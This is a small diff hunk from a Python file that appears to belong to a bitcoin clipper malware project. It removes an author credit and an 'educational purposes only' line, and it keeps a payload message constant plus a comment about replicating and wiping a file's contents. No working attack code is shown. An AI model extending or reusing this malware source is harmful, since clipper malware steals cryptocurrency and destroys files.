@@ -7,8 +7,6 @@ import os
 import sys
 import logging
 
-# DEVELOPED BY NIGHTFALL#2512 / GITHUB.COM/NIGHTFALLGT / EDUCATIONAL PURPOSES ONLY
-
 BTC_ADDRESS = 'you have been infected by btc clipper malware'
 
 #Add code/ message in current.py file after deleting current .py file contents after replicating.
